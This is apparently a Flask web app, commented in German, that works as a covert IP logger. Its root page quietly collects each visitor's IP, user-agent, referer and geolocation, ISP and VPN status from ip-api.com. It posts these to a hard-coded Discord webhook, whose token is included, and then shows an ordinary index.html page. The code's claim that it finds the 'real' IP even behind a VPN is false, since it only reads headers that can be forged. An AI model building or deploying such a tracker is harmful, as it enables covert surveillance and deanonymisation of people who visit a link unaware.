from flask import Flask, request, render_template
import requests
import os
from datetime import datetime
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)

app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)

WEBHOOK_URL = "https://discord.com/api/webhooks/1527235730055630858/VLFC3_nVPd0zdVMZLN5A9utw1oWapMWx0MLIKXYYKv551KmndGOKbITTiKO-Hc57evMT"

def get_real_ip():
    """
    Holt die ECHTE IP – selbst bei VPN/Proxy.
    """
    # Cloudflare (falls du es mal davor schaltest)
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    
    # X-Forwarded-For (erste IP ist die echte)
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    
    # X-Real-IP (oft bei Nginx Proxies)
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    
    # Fallback: Direkte Verbindung
    return request.remote_addr

def check_if_vpn(ip):
    """
    Prüft mit ip-api.com, ob die IP ein VPN/Proxy ist.
    Gibt (bool, dict) zurück – (ist_vpn, infos)
    """
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,proxy,hosting', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                ist_vpn = data.get('proxy', False) or data.get('hosting', False)
                return ist_vpn, data
    except:
        pass
    return False, None

@app.route('/')
def home():
    # 1. Echte IP ermitteln
    real_ip = get_real_ip()
    user_agent = request.headers.get('User-Agent', 'Unbekannt')
    referer = request.headers.get("Referer", "Kein Referer")
    accept_language = request.headers.get('Accept-Language', 'Unbekannt')
    
    # 2. VPN-Prüfung
    ist_vpn, geo_data = check_if_vpn(real_ip)
    
    # 3. Discord Embed erstellen
    embed = {
        "embeds": [{
            "title": "🕵️ Neue IP erfasst!",
            "color": 0xFF0000 if ist_vpn else 0x00FF00,
            "fields": [
                {
                    "name": "🌐 IP-Adresse",
                    "value": f"`{real_ip}`",
                    "inline": False
                },
                {
                    "name": "🔒 VPN/Proxy",
                    "value": "✅ **JA**" if ist_vpn else "❌ NEIN",
                    "inline": True
                },
                {
                    "name": "🌍 Standort",
                    "value": f"{geo_data.get('country', 'Unbekannt')} / {geo_data.get('regionName', '')} / {geo_data.get('city', '')}" if geo_data else "Unbekannt",
                    "inline": True
                },
                {
                    "name": "🏢 ISP",
                    "value": geo_data.get('isp', 'Unbekannt') if geo_data else "Unbekannt",
                    "inline": True
                },
                {
                    "name": "🖥️ User-Agent",
                    "value": f"```{user_agent[:150]}```",
                    "inline": False
                },
                {
                    "name": "🔗 Referer",
                    "value": referer[:100],
                    "inline": False
                },
                {
                    "name": "⏰ Zeit",
                    "value": datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "IP-Logger by Render | Echte IP-Erkennung"
            }
        }]
    }
    
    # 4. An Discord senden
    try:
        r = requests.post(WEBHOOK_URL, json=embed, timeout=10)
        print(f"[{datetime.now()}] Webhook Status: {r.status_code} - IP: {real_ip}")
    except Exception as e:
        print(f"[{datetime.now()}] Error: {str(e)}")
    
    # 5. Index.html anzeigen
    return render_template("index.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
